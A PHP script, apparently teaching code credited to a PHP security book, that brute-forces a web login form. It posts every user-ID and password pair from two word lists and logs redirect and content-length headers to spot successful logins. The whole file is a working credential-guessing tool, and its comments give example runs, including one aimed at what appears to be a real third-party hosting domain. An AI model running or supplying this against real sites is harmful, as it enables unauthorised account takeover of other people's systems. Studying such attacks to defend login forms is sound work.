<?php
    /*
     * Based on Chris Shiflett, Essential PHP Security, 2005, O'Reilly
     * Chapter 7
     */
    if (count($argv) != 7) {
        $s = "php bruteforceattack.php -- localhost urlpath userids passwords results\n";
        $s .= "the latter three being filenames\n";
        die($s);
    }
    $host = $argv[2];
    $url = $argv[3];
    $ids = file_get_contents($argv[4]);
    $idsa = explode(PHP_EOL, $ids);
    $pwds = file_get_contents($argv[5]);
    $pwdsa = explode(PHP_EOL, $pwds);
    $log = $argv[6];

    $http_header = '';
    $http_header .= "POST /" . $url . " HTTP/1.1\r\n";
    $http_header .= "Host: " . $host ."\r\n";
    $http_header .= "Content-Type: application/x-www-form-urlencoded\r\n";
    $http_header .= "Content-Length: %s\r\n";
    $http_header .= "Connection: close\r\n";
    $http_header .= "\r\n";

    $start = time();
    $s = '';
    foreach($idsa as $uid) {
        if ($uid == '')
            break;
        foreach($pwdsa as $pwd) {
            $content  = 'user=';
            $content .= $uid;
            $content .= '&password=';
            $content .= $pwd;
            $request = $http_header . $content;
            $request = sprintf($request, strlen($content));
            $response = '';

            if ($handle = fsockopen($host, 80)) {
                fputs($handle, $request);
                while (!feof($handle)) {
                    $response .= fgets($handle, 1024);
                }
                fclose($handle);
                /* Check response
                 * 1st, the return address */
                preg_match('/Location: \S+/', $response, $m, PREG_OFFSET_CAPTURE);
                if (count($m))
                    $s .= sprintf("\n%s %s", $content, $m[0][0]);
                /* 2nd, length of return */
                preg_match('/Content-Length: \d+/', $response, $m, PREG_OFFSET_CAPTURE);
                if (count($m))
                    $s .= sprintf("\n%s %s", $content, $m[0][0]);
            } else {
                /* Error in sockopen */
                die("WTF");
            }
        }
    }
    file_put_contents($log, $s);
    $stop = time();
    echo ("\n".$stop - $start);
    echo "\n";
                                                 // host, urlpath, uid file, pwd file, results log file
    // execute like so: php bruteforceattack.php -- localhost x15.dk/webdev/code/Security/login0Auth.php darkuids.txt darkpwds.txt darkresults.txt
    // php bruteforceattack.php -- unoeuro.com vg-app.dk/inc/login.php uids.txt pwds.txt darkresults.txt


    // In log file look for changes in header location or content length.
?>
